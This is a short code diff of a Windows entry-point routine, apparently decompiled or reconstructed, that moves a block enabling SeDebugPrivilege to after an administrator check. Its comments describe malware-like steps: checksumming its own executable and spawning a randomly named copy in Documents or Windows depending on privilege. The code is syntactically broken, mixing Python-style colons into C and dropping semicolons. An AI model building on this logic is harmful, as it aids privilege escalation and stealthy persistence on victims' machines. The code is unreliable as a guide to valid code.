@@ -87,11 +87,6 @@ wWinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nShowCm
     //Store the checksum of the executable
     exeChecksum = getExeChecksum()
 
-    //Enable SeDebugPrivilege if allowed
-    if (LookupPrivilegeValueA((LPCSTR)0x0,"SeDebugPrivilege",(PLUID)&NTAuthority) != 0):
-        enablePrivilege(&NTAuthority);
-
-
     //Checks if process is run as administrator and stores value as a global variable
 
     //https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-checktokenmembership
@@ -125,6 +120,10 @@ wWinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nShowCm
         FreeSid(AdministratorsGroup); 
     }
     _isAdmin = b;
+     
+    //Enable SeDebugPrivilege if allowed
+    if (LookupPrivilegeValueA((LPCSTR)0x0,"SeDebugPrivilege",(PLUID)&NTAuthority) != 0):
+        enablePrivilege(&NTAuthority);
 
     //Create a new process with a random name if there is no file of the same name in \Documents or \Windows depending on whether the process is running as admin
     retCode = getSelfIntegrityLevel(&AdministratorsGroup)
